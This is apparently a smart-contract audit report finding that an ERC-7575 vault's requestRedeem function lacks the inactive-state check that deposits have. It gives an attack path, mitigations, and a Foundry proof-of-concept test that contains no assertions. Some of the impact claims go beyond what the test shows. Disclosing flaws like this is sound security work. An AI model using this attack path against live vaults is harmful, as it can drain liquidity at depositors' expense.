# S1 - `ERC7575VaultUpgradeable.requestRedeem()` Missing `isActive` Check Allows Strategic Redeem Queuing During Inactive Periods

## Description

In `ERC7575VaultUpgradeable`, deposit requests are explicitly blocked when the vault is inactive, but redeem requests remain allowed. This creates an asymmetric condition:

- Deposits → Revert when inactive
- Redeems → Still accepted when inactive

This design flaw allows an attacker to queue large redemption requests while the vault is inactive (a period intended for safety, maintenance, or orderly shutdown). Once the vault becomes active again, all queued redemptions can be executed at once, creating liquidity stress, price manipulation opportunities, and unfair withdrawal ordering that disadvantages normal users.

## Root Cause

### 1. Missing Active-State Check

Inside `requestDeposit(...)`, an explicit guard exists:

```solidity
function requestDeposit(...) {
    if (!$.isActive) revert VaultNotActive();
}
```

However, `requestRedeem(...)` lacks an equivalent check:

```solidity
function requestRedeem(uint256 shares, address controller, address owner)
    external nonReentrant returns (uint256 requestId)
{
    // No isActive check
}
```

### 2. Asymmetric User Capabilities

During inactive periods:

| Action           | Behavior |
|------------------|----------|
| requestDeposit   | Reverts  |
| requestRedeem    | Allowed  |

This permits accumulation of a large redemption queue with no ability for new deposits to offset outflows.

## Impact

- All queued redeems become immediately eligible for fulfillment once the vault is reactivated.
- Multi-vault ShareToken conversion math may become skewed due to sudden asset outflows.
- Attackers can queue extremely large redemptions during inactivity, causing liquidity shock upon reactivation.
- Depositors may suffer slippage, delayed withdrawals, or forced liquidation losses.
- Vault managers lose the ability to perform an orderly redemption process.

## Attack Path

1. Vault is set to inactive:

```solidity
setVaultActive(false);
```

State:

```text
isActive = false
```

2. Attacker queues redeems while inactive:

```solidity
requestRedeem(attackerShares, attacker, attacker);
```

Calls are accepted and can be repeated with large share amounts.

3. Deposits remain blocked:

```solidity
requestDeposit(...) → VaultNotActive
```

4. Vault is reactivated:

```solidity
setVaultActive(true);
```

5. Fulfillment begins:

```solidity
fulfillRedeem(...)
```

Mass redemption drains liquidity, triggers forced liquidations, and distorts prices across the vault ecosystem.

## Preconditions

- Vault is inactive (`isActive = false`).
- `requestRedeem` is callable without whitelist or cap checks.
- Attacker owns sufficient shares.
- No cap on redemption batch sizes.
- Vault assets require liquidation to satisfy withdrawals.

## Recommended Mitigations

### Mitigation A — Add `isActive` Guard to `requestRedeem`

```solidity
VaultStorage storage $ = _getVaultStorage();
if (!$.isActive) revert VaultNotActive();
```

This restores symmetric behavior between deposits and redeems.

### Mitigation B — If Redeems Must Remain Allowed While Inactive

Add compensating safeguards:

1. Throttle redemption queue growth:

```solidity
if (!$.isActive && pendingRedeemAssets + requestedAssets > MAX_REDEEM_DURING_INACTIVE) {
    revert RedeemQueueLimitExceeded();
}
```

2. Two-step fulfillment after reactivation:
- Require manual review or delayed execution if queued redeems exceed a safe threshold.

3. Emit warnings:
- Allow off-chain monitoring to detect abnormal redemption queue spikes.

## Proof of Concept

Create a file `RedeemRequest.t.sol` in the `test` folder and paste the following code.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {ERC7575VaultUpgradeable} from "../src/ERC7575VaultUpgradeable.sol";
import {ShareTokenUpgradeable} from "../src/ShareTokenUpgradeable.sol";

contract MockAsset is ERC20 {
    constructor() ERC20("MockAsset", "MA") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract RedeemInactive_PoC is Test {
    MockAsset public asset;
    ShareTokenUpgradeable public shareToken;
    ERC7575VaultUpgradeable public vault;

    address owner    = address(this);
    address victim   = address(0xBBB);
    address attacker = address(0xAAA);

    function setUp() public {
        asset = new MockAsset();

        asset.mint(attacker, 1_000_000e18);
        asset.mint(victim,   1_000_000e18);

        ShareTokenUpgradeable implST = new ShareTokenUpgradeable();
        bytes memory stInit = abi.encodeWithSelector(
            ShareTokenUpgradeable.initialize.selector, "ShareToken", "SHARE", owner
        );
        shareToken = ShareTokenUpgradeable(address(new ERC1967Proxy(address(implST), stInit)));

        ERC7575VaultUpgradeable implVault = new ERC7575VaultUpgradeable();
        bytes memory vInit = abi.encodeWithSelector(
            ERC7575VaultUpgradeable.initialize.selector, asset, address(shareToken), owner
        );
        vault = ERC7575VaultUpgradeable(address(new ERC1967Proxy(address(implVault), vInit)));

        shareToken.registerVault(address(asset), address(vault));

        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(vault), type(uint256).max);
        vm.stopPrank();
    }

    function test_RedeemDuringInactive() public {
        vm.startPrank(victim);
        vault.requestDeposit(200_000e18, victim, victim);
        vm.stopPrank();

        vault.fulfillDeposit(victim, 200_000e18);

        vm.startPrank(victim);
        uint256 victimShares = vault.deposit(200_000e18, victim);
        vm.stopPrank();

        vm.startPrank(attacker);
        vault.requestDeposit(300_000e18, attacker, attacker);
        vm.stopPrank();

        vault.fulfillDeposit(attacker, 300_000e18);

        vm.startPrank(attacker);
        uint256 attackerShares = vault.deposit(300_000e18, attacker);
        vm.stopPrank();

        vault.setVaultActive(false);

        vm.startPrank(attacker);
        uint256 reqId = vault.requestRedeem(attackerShares, attacker, attacker);
        vm.stopPrank();

        vault.setVaultActive(true);
        vault.fulfillRedeem(attacker, attackerShares);

        vm.startPrank(attacker);
        vault.redeem(attackerShares, attacker, attacker);
        vm.stopPrank();
    }
}
```

## How to Run

```bash
forge test --match-test test_RedeemDuringInactive -vv
```

## Expected Output

The test passes and demonstrates that redeem requests can be queued during inactive periods and executed immediately upon reactivation, confirming the vulnerability.

